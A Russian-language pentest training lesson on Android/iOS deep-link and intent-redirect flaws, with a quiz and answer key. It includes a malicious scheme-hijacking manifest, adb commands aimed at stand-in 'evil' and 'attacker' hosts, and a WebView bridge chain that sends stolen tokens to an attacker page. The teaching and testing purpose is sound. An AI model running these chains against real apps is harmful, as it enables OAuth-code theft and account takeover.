---
id: mobile-deeplink-deep
title: "Deep-link / intent-redirect: цепочки захвата аккаунта"
category: mobile
parent: mobile-intents-deeplinks
difficulty: hard
order: 1
tags: [deeplink, intent-redirect, app-links, ato, oauth, android, hijack]
prerequisites: [mobile-intents-deeplinks, mobile-webview]
useful_for:
  - "CTF Mobile (захват токена через deep link)"
  - "Bug bounty (account takeover через redirect)"
  - "Пентест мобильных приложений"
estimated_minutes: 40
summary: "Как deep links и intent redirect приводят к краже OAuth-токенов и захвату аккаунта: hijacking custom scheme, обход App Links, редиректы на произвольный компонент, цепочки до ATO."
---
## Введение

Deep link — это ссылка, открывающая конкретный экран приложения: `myapp://path` (custom scheme) или `https://app.example/path` (App Links / Universal Links). Intent redirect — ситуация, когда приложение пересылает входящий Intent дальше, в том числе на экспортированный компонент или внешний URL. Вместе эти механизмы образуют классические цепочки захвата аккаунта: перехват OAuth-кода, кража токена, открытие произвольного экрана с произвольными параметрами.

Мобильные разработчики часто относятся к ссылкам как к «своему» интерфейсу и не рассматривают их как внешний, недоверенный ввод. Это фундаментальная ошибка: deep link может сформировать любое приложение, любая веб-страница, любое SMS или QR-код. Значит, всё, что приходит по ссылке, — это недоверенные данные, которые требуют валидации так же строго, как данные из сетевого запроса.

## Модель угроз и типы ссылок

Разберём три механизма и их доверительные свойства:

- **Custom scheme (`myapp://`).** Регистрируется в манифесте/Info.plist. Не защищена: любое приложение может заявить ту же схему, и система не гарантирует, кто откроет ссылку. Классический hijacking.
- **App Links (Android) / Universal Links (iOS).** Используют `https://` и привязку к домену через `assetlinks.json` / `apple-app-site-association`. Надёжнее, но зависят от широты `pathPrefix`/`paths` и от того, проверяет ли обработчик домен.
- **Intent-based (Android).** Компонент с `intent-filter` (`VIEW` + `BROWSABLE`), принимающий `Intent`.

Для каждого механизма спросите: может ли внешняя сторона сформировать ссылку? Проверяет ли приложение источник? Что делает с параметрами?

## Custom scheme hijacking: детально

Если приложение A обрабатывает `myapp://oauth?code=...`, а злоумышленник зарегистрировал ту же схему, он перехватит код. На Android два приложения с одной схемой — система покажет выбор или отдаст последнему; на iOS — последнему установленному.

```xml
<!-- зловредный манифест -->
<activity android:name=".Evil" android:exported="true">
  <intent-filter android:priority="999">
    <action android:name="android.intent.action.VIEW"/>
    <category android:name="android.intent.category.DEFAULT"/>
    <category android:name="android.intent.category.BROWSABLE"/>
    <data android:scheme="myapp" android:host="oauth"/>
  </intent-filter>
</activity>
```

Проверьте, приходит ли по схеме что-то ценное: OAuth-код, токен, ссылка-редирект, параметры оплаты. Если да — hijacking ведёт к утечке.

## App Links / Universal Links: обход

Проверьте конфигурацию домена и обработчик:

```bash
curl -s https://app.example/.well-known/assetlinks.json | jq .
curl -s https://app.example/.well-known/apple-app-site-association | jq .
```

Слабые места:

- широкий `pathPrefix` (`/`) или `paths: ["*"]` — внешняя ссылка открывает внутренние экраны;
- отсутствие проверки домена в `getData()`/`webpageURL.host` — поддельный хост с валидным путём;
- редирект на произвольный URL из параметра;
- `autoVerify` не включён (Android) — ссылку перехватит другое приложение;
- обработчик доверяет параметрам (`url`, `next`, `redirect`).

## Intent redirect и вложенные Intent

Приложение получает Intent и пересылает дальше:

```java
Intent fwd = new Intent(Intent.ACTION_VIEW, Uri.parse(getIntent().getStringExtra("url")));
startActivity(fwd);   // открывает произвольный URL/компонент
```

Или передаёт вложенный Intent (`Parcelable`) на экспортированный компонент → доступ к внутренним экранам с произвольными параметрами:

```java
Intent nested = getIntent().getParcelableExtra("intent");
startActivity(nested);   // атакующий контролирует вложенный Intent
```

Ищите в декомпилированном коде: `getParcelableExtra("intent")`, `getStringExtra("url")`, `startActivity`/`startService`/`sendBroadcast` с пользовательскими данными, а также `getIntent().getData()`.

## Цепочки до захвата аккаунта (ATO)

1. Ссылка `myapp://webview?url=https://attacker/steal` открывает WebView с JS-мостом, читающим токен.
2. `myapp://oauth?code=` перехватывается → обмен кода на токен (если нет PKCE).
3. Redirect на произвольный компонент → запуск экрана смены пароля/почты с параметрами.
4. Вложенный Intent на экспортированную activity, которая выполняет привилегированное действие.

Собирайте цепочку по звеньям и документируйте каждое: ссылка → что открылось → что произошло.

## Практическое тестирование: adb, Frida, инструменты

```bash
# Android: открыть deep link
adb shell am start -a android.intent.action.VIEW -d "myapp://webview?url=https://evil"
adb shell am start -a android.intent.action.VIEW -d "https://app.example/redirect?next=https://evil"
# прямой запуск компонента с параметром
adb shell am start -n com.target/.InternalActivity --es url https://evil
# вложенный Intent (parcelable) — через am start --ez/--es нельзя, нужен PoC-апп
```

Frida: хук `onNewIntent`/`getIntent` — смотреть параметры и что с ними делают.

```javascript
Java.perform(function () {
  var Activity = Java.use('android.app.Activity');
  Activity.onNewIntent.implementation = function (intent) {
    console.log('[onNewIntent] ' + intent.getDataString() +
                ' extras=' + intent.getExtras());
    return this.onNewIntent(intent);
  };
});
```

## Разобранный пример

Bug bounty: `myapp://webview?url=` открывает URL в WebView с JS-мостом, читающим токен из нативной памяти. Пентестер подставляет `url=https://attacker/x.html`, жертва кликает ссылку, токен уходит атакующему → ATO. Отчёт: deep-link → WebView → кража токена.

Второй пример: `myapp://oauth?code=...&state=...` без валидации `state`; стороннее приложение регистрирует схему `myapp`, получает код и обменивает его на токен.

## Частые ошибки и подводные камни

- Тестировать только custom scheme, пропуская App Links/Universal Links.
- Не проверять обработку параметров (`url`, `next`, `redirect`, `intent`, `callback`).
- Забывать про `getParcelableExtra` и вложенные Intent.
- Игнорировать `autoVerify` (без него App Link перехватывается).
- Не проверять, что обработчик сверяет домен ссылки.
- Считать, что `exported=false` на activity защищает — внешний Intent может прийти через `intent-redirect` от самого приложения.

## Справочная таблица

| Механизм | Защита | Слабость |
|----------|--------|----------|
| Custom scheme | нет | hijacking, любой заявляет схему |
| App/Universal Links | домен | широкий path, нет проверки host |
| Intent filter | exported | перехват/redirect |
| Вложенный Intent | нет | контроль атакующего |
| WebView из deep link | JS-мост | кража токена/XSS |

## Что делать дальше / решение

- **Redirect/open redirect** → стройте цепочку с токеном/OAuth-кодом.
- **WebView с мостом** → XSS/кража токена.
- **Intent redirect на компонент** → доступ к внутренним экранам.
- **Всё валидируется** → ищите обход (кодировки, регистр, юзер-инфо в URL, двойное кодирование).
- Severity: перехват токена/кода → High/Critical; open redirect без цепочки → Medium.

## Глубокий разбор: intent-redirect и захват привилегий

Intent redirect — самый недооценённый вариант. Приложение получает внешний Intent и передаёт вложенный (`Parcelable`) дальше:

```java
// уязвимый обработчик
Intent nested = getIntent().getParcelableExtra("intent");
nested.setClassName(getPackageName(), "com.target.PrivateActivity");
startActivity(nested);   // атакующий управляет вложенным Intent
```

Атакующий собирает PoC-приложение, которое кладёт в extra свой Intent, нацеленный на приватную activity или сервис с привилегиями. Проверка через `am`:

```bash
# прямая проверка компонента
adb shell am start -n com.target/.PrivateActivity --es cmd "deleteAll"
# через intent-redirect — нужен PoC-апп, передающий вложенный Parcelable
```

Ищите по коду: `getParcelableExtra("intent")`, `getIntent().getParcelableExtra`, `startActivity(Intent)`, где Intent пришёл извне.

## WebView из deep link: цепочка к краже токена

Частая связка: deep link открывает WebView с URL из параметра, а в WebView добавлен JS-мост (`addJavascriptInterface`), читающий токен из нативной памяти.

```javascript
// приложение (уязвимо)
webView.addJavascriptInterface(new Bridge(), "app");
class Bridge { @JavascriptInterface public String getToken(){ return token; } }
```

Атакующий отдаёт `url=https://attacker/x.html`, страница вызывает `app.getToken()` и отправляет токен себе. Проверьте: загрузку произвольного URL из deep link, наличие `setAllowFileAccess`, `setJavaScriptEnabled(true)` + мост.

## Матрица находок и severity

| Находка | Последствие | Severity |
|---------|-------------|----------|
| Перехват OAuth-кода | ATO | High/Critical |
| WebView + мост из deep link | кража токена | High |
| Intent-redirect на приватный компонент | доступ к внутренним экранам | High |
| Open redirect | фишинг | Medium |
| Широкий pathPrefix | доступ к экранам | Medium |

## Что делать дальше

- Соберите минимальный PoC для каждого звена (ссылка → эффект).
- Проверьте обходы: URL-кодирование, двойное кодирование, регистр схемы, user-info в URL (`myapp://x@evil`).
- Если найдена цепочка до ATO — оформите как High/Critical с полным сценарием.

## Квиз

```quiz
- question: "Чем App Links надёжнее custom scheme?"
  options:
    - "Привязаны к домену через assetlinks.json/AASA"
    - "Они быстрее"
    - "Они не используют https"
    - "Они не требуют параметров"
  answer: 0
  explanation: "Ассоциация домена мешает чужому приложению заявить ту же ссылку."
- question: "Что такое intent redirect?"
  options:
    - "Приложение пересылает входящий Intent дальше (URL/компонент)"
    - "Смена темы"
    - "Шифрование трафика"
    - "Резервное копирование"
  answer: 0
  explanation: "Пересылка недоверенного Intent ведёт к открытию произвольного экрана."
- question: "Какой параметр часто эксплуатируют в deep-link?"
  options:
    - "url / next / redirect"
    - "lang"
    - "theme"
    - "dpi"
  answer: 0
  explanation: "Параметры-редиректы уводят на произвольный ресурс."
- question: "Что нужно для корректной работы App Links?"
  options:
    - "assetlinks.json на домене и autoVerify"
    - "Только HTTPS"
    - "Только иконка"
    - "Только Android 12"
  answer: 0
  explanation: "Без проверки домена и autoVerify ссылку перехватит другое приложение."
- question: "Как открыть deep link через adb?"
  options:
    - "am start -a android.intent.action.VIEW -d <uri>"
    - "pm install"
    - "dumpsys"
    - "screencap"
  answer: 0
  explanation: "am start с ACTION_VIEW и -d запускает ссылку."
```

## Где пригодится

- **CTF Mobile:** захват токена через deep-link.
- **Bug bounty:** ATO через redirect/hijacking — высокооплачиваемые находки.
- **Пентест:** аудит ссылок и редиректов.
- **Работа:** ревью deep-link-логики.
